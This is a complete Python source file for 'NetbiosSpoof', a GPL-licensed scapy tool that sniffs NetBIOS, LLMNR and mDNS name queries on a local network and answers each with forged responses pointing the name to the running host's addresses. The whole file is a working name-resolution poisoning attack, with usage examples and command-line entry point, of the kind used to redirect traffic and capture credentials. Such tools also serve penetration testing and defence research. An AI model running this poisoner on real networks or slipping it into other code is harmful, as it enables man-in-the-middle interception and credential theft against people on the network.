#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).

>>> spoofer = NetbiosSpoof()
>>> spoofer.start(True)
>>> spoofer.stop()
>>> spoofer = NetbiosSpoof("172.17.0.")

~# python3 NetbiosSpoof.py
[22/06/2022 06:19:32] WARNING  (30) {__main__ - NetbiosSpoof.py:451} The netbios spoofer starts up...
[22/06/2022 06:19:32] CRITICAL (50) {__main__ - NetbiosSpoof.py:470} The netbios spoofer is stopped.
~# python3 NetbiosSpoof.py -v -i 172.17.0.
[22/06/2022 06:19:32] DEBUG    (10) {__main__ - NetbiosSpoof.py:497} Logging is configured.
[22/06/2022 06:19:32] DEBUG    (10) {__main__ - NetbiosSpoof.py:141} Start network interface detection...
[22/06/2022 06:19:32] INFO     (20) {__main__ - NetbiosSpoof.py:150} Interface argument match with (172.17.0.2 89:3c:10:40:61:b1 WIFI)
[22/06/2022 06:19:32] DEBUG    (10) {__main__ - NetbiosSpoof.py:157} Use network interface WIFI
[22/06/2022 06:19:32] WARNING  (30) {__main__ - NetbiosSpoof.py:451} The netbios spoofer starts up...
[22/06/2022 06:19:32] INFO     (20) {__main__ - NetbiosSpoof.py:430} Protocol DNS, spoof b'kali.local.' for 172.17.0.3
[22/06/2022 06:19:32] CRITICAL (50) {__main__ - NetbiosSpoof.py:470} The netbios spoofer is stopped.
"""

__version__ = "1.0.2"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a Hostname Spoofer (Netbios, LLMNR and Local DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/NetbiosSpoof"

copyright = """
NetbiosSpoof  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["NetbiosSpoof", "main"]

from scapy.all import (
    NBNSQueryRequest,
    LLMNRQuery,
    LLMNRResponse,
    DNS,
    DNSQR,
    DNSRR,
    Raw,
    send,
    sniff,
    IP,
    IPv6,
    UDP,
    Packet,
    IFACES,
    AsyncSniffer,
    conf,
)
from logging import StreamHandler, Formatter, Logger
from argparse import ArgumentParser
from ipaddress import ip_interface
import scapy.interfaces
import logging
import sys


def get_custom_logger() -> Logger:

    """
    This function create a custom logger.
    """

    logger = logging.getLogger(__name__)  # default logger.level == 0

    formatter = Formatter(
        fmt=(
            "%(asctime)s%(levelname)-9s(%(levelno)s) "
            "{%(name)s - %(filename)s:%(lineno)d} %(message)s"
        ),
        datefmt="[%Y-%m-%d %H:%M:%S] ",
    )
    stream = StreamHandler(stream=sys.stdout)
    stream.setFormatter(formatter)

    logger.addHandler(stream)

    return logger


class NetbiosSpoof:

    """
    This class implements a netbios spoofer.
    """

    def __init__(self, interface: str = None):
        self.multicast_v4 = "224.0.0.251"
        self.multicast_v6 = "ff02::fb"
        self.run = True
        self.string_iface = interface
        self.iface = self.get_iface()
        self.mac = self.iface.mac
        self.ip = self.iface.ip
        self.raw_ip = ip_interface(self.ip).packed
        self.ipv6 = self.iface.ips[6]
        self.ipv6_number = len(self.ipv6)

    def get_iface(self) -> scapy.interfaces.NetworkInterface:

        """
        This function get a NetworkInterface from iface arguments
        (a part of IP or MAC addresses or interface name).
        """

        self.iface = conf.iface
        logger.debug("Start network interface detection...")

        if self.string_iface is not None:
            for iface_ in IFACES.values():
                if (
                    self.string_iface in iface_.ip
                    or self.string_iface in iface_.mac
                    or self.string_iface in iface_.network_name
                ):
                    logger.info(
                        "Interface argument match with "
                        f"({iface_.ip} {iface_.mac} {iface_.name})"
                    )
                    self.iface = iface_
                    break

        logger.debug(f"Use network interface {self.iface.name}")
        return self.iface

    def craft_NBNS_response(self, packet: Packet) -> Packet:

        """
        This function crafts the Netbios response.
        """

        source = packet[IP].src
        query = packet[NBNSQueryRequest]
        name = query.QUESTION_NAME

        return (
            [
                IP(ihl=5, proto=17, dst=source)
                / UDP(sport=137, dport=137)
                / NBNSQueryRequest(
                    NAME_TRN_ID=query.NAME_TRN_ID,
                    FLAGS=34048,
                    QDCOUNT=0,
                    ANCOUNT=1,
                    QUESTION_NAME=name,
                )
                / Raw(load=b"\x00\x04\x93\xe0\x00\x06\x00\x00" + self.raw_ip)
            ],
            source,
            name,
            "NBT-NS",
        )

    def craft_LLMNR_IP_type_28(self, packet: Packet) -> Packet:

        """
        This function craft an IP-LLMNR packet, type 28.
        """

        name = packet[DNSQR].qname
        source = packet[IP].src

        return (
            [
                IP(ihl=5, proto=17, dst=source)
                / UDP(sport=5355, dport=packet[UDP].sport)
                / LLMNRResponse(
                    id=packet[LLMNRQuery].id,
                    qdcount=1,
                    ancount=2,
                    qd=DNSQR(qname=name, qtype=28),
                    an=self.craft_DNSv6_response(name),
                )
            ],
            source,
            name,
            "LLMNR",
        )

    def craft_LLMNR_IP(self, packet: Packet) -> Packet:

        """
        This function craft an IP-LLMNR packet.
        """

        name = packet[DNSQR].qname
        source = packet[IP].src

        return (
            [
                IP(ihl=5, proto=17, dst=source)
                / UDP(sport=5355, dport=packet[UDP].sport)
                / LLMNRResponse(
                    id=packet[LLMNRQuery].id,
                    qdcount=1,
                    ancount=1,
                    qd=DNSQR(qname=name),
                    an=DNSRR(rrname=name, ttl=30, rdata=self.ip),
                )
            ],
            source,
            name,
            "LLMNR",
        )

    def craft_LLMNR_IPv6_type_28(self, packet: Packet) -> Packet:

        """
        This function craft an IPv6-LLMNR packet, type 28.
        """

        name = packet[DNSQR].qname
        source = packet[IPv6].src

        return (
            [
                IPv6(dst=source)
                / UDP(sport=5355, dport=packet[UDP].sport)
                / LLMNRResponse(
                    id=packet[LLMNRQuery].id,
                    qdcount=1,
                    ancount=self.ipv6_number,
                    qd=DNSQR(qname=name, qtype=28),
                    an=self.craft_DNSv6_response(name),
                )
            ],
            source,
            name,
            "LLMNR",
        )

    def craft_LLMNR_IPv6(self, packet: Packet) -> Packet:

        """
        This function craft an IPv6-LLMNR packet.
        """

        name = packet[DNSQR].qname
        source = packet[IPv6].src

        return (
            [
                IPv6(dst=source)
                / UDP(sport=5355, dport=packet[UDP].sport)
                / LLMNRResponse(
                    id=packet[LLMNRQuery].id,
                    qdcount=1,
                    ancount=1,
                    qd=DNSQR(qname=name),
                    an=DNSRR(rrname=name, ttl=30, rdata=self.ip),
                )
            ],
            source,
            name,
            "LLMNR",
        )

    def detect_LLMNR_type(self, packet: Packet) -> Packet:

        """
        This function detects the IP version and DNSQR
        type to forge the LLMNR response.
        """

        if packet.haslayer(IP):
            if packet[DNSQR].qtype == 28:
                return self.craft_LLMNR_IP_type_28(packet)
            else:
                return self.craft_LLMNR_IP(packet)
        elif packet.haslayer(IPv6):
            if packet[DNSQR].qtype == 28:
                return self.craft_LLMNR_IPv6_type_28(packet)
            else:
                return self.craft_LLMNR_IPv6(packet)

    def craft_MDNS_IP(self, packet: Packet) -> Packet:

        """
        This function crafts a MDNS-IP packet.
        """

        name = packet[DNSQR].qname

        return (
            [
                IP(ihl=5, proto=17, dst=self.multicast_v4)
                / UDP(sport=5353, dport=5353)
                / DNS(
                    qr=1,
                    aa=1,
                    rd=0,
                    ancount=self.ipv6_number,
                    an=self.craft_DNSv6_response(name),
                ),
                IP(ihl=5, proto=17, dst=self.multicast_v4)
                / UDP(sport=5353, dport=5353)
                / DNS(
                    qr=1,
                    aa=1,
                    rd=0,
                    ancount=1,
                    an=DNSRR(ttl=30, rrname=name, rdata=self.ip),
                ),
            ],
            packet[IP].src,
            name,
            "DNS",
        )

    def craft_DNSv6_response(self, name: str) -> Packet:

        """
        This function crafts a IPv6-DNS response.
        """

        if self.ipv6_number:
            response = None
            for ip in self.ipv6:
                if response:
                    response /= DNSRR(
                        ttl=30,
                        rrname=name,
                        type=28,
                        rdata=ip,
                    )
                else:
                    response = DNSRR(
                        ttl=30,
                        rrname=name,
                        type=28,
                        rdata=ip,
                    )
            return response

    def craft_MDNS_IPv6(self, packet: Packet) -> Packet:

        """
        This function crafts a MDNS-IPv6 packet.
        """

        name = packet[DNSQR].qname

        return (
            [
                IPv6(dst=self.multicast_v6)
                / UDP(sport=5353, dport=5353)
                / DNS(
                    qr=1,
                    aa=1,
                    rd=0,
                    ancount=self.ipv6_number,
                    an=self.craft_DNSv6_response(name),
                ),
                IPv6(dst=self.multicast_v6)
                / UDP(sport=5353, dport=5353)
                / DNS(
                    qr=1,
                    aa=1,
                    rd=0,
                    ancount=1,
                    an=DNSRR(ttl=30, rrname=name, rdata=self.ip),
                ),
            ],
            packet[IPv6].src,
            name,
            "DNS",
        )

    def detect_ip_version_DNS(self, packet: Packet) -> Packet:

        """
        This function crafts the DNS response.
        """

        if packet.haslayer(IP):
            return self.craft_MDNS_IP(packet)
        elif packet.haslayer(IPv6):
            return self.craft_MDNS_IPv6(packet)

    def identify_packet(self, packet: Packet) -> None:

        """
        This function detects the request type and send the response.
        """

        if packet.haslayer(NBNSQueryRequest) and packet[IP].src != self.ip:
            responses, ip_src, name, style = self.craft_NBNS_response(packet)
        elif packet.haslayer(LLMNRQuery):
            responses, ip_src, name, style = self.detect_LLMNR_type(packet)
        elif packet.haslayer(DNS) and packet.haslayer(DNSQR):
            responses, ip_src, name, style = self.detect_ip_version_DNS(packet)
        else:
            return None
        for response in responses:
            send(response, verbose=0, iface=self.iface)
        logger.info(f"Protocol {style}, spoof {name} for {ip_src}")

    def stop(self) -> None:

        """
        This function stops the netbios spoofer (and the network sniffer).
        """

        self.run = False
        sniffer = getattr(self, "sniffer", None)
        if sniffer:
            sniffer.stop()
        logger.info("Spoofer/Sniffer stops... Please wait a moment...")

    def start(self, asynchronous: bool = False) -> None:

        """
        This function starts the netbios spoofer (and the network sniffer).
        """

        self.run = True
        logger.warning("The netbios spoofer starts up...")

        if asynchronous:
            sniffer = AsyncSniffer(
                store=False,
                filter="(port 5353 or port 5355 or port 137) and proto UDP",
                stop_filter=lambda x: not self.run,
                prn=self.identify_packet,
                iface=self.iface,
            )
            sniffer.start()
        else:
            sniff(
                store=False,
                filter="(port 5353 or port 5355 or port 137) and proto UDP",
                stop_filter=lambda x: not self.run,
                prn=self.identify_packet,
                iface=self.iface,
            )
            logger.critical("The netbios spoofer is stopped.")


def main() -> None:

    """
    This function starts the netbios spoofer from the command line.
    """

    parser = ArgumentParser(
        description="This script spoofs host names on a network."
    )
    parser.add_argument(
        "--iface", "-i", help="Part of the IP, MAC or name of the interface"
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help="Mode verbose (print debug message)",
        action="store_true",
    )
    arguments = parser.parse_args()

    logger.setLevel(logging.DEBUG if arguments.verbose else logging.WARNING)

    logger.debug("Logging is configured.")

    spoofer = NetbiosSpoof(arguments.iface)

    try:
        spoofer.start()
    except KeyboardInterrupt:
        logger.critical("The netbios spoofer is stopped.")


logger: Logger = get_custom_logger()
print(copyright)

if __name__ == "__main__":
    main()
    sys.exit(0)
